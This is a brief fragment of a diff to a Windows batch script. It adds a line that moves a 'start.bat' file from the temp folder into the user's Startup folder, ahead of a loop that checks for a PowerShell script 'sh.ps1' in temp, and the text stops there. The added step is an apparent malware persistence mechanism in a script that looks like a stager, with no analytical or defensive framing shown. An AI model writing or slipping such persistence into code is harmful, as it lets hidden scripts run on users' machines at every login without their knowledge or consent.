@@ -1,4 +1,6 @@
 @echo off
+move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+
 :loop
 set FILE=%temp%\sh.ps1
 if not exist %FILE% (
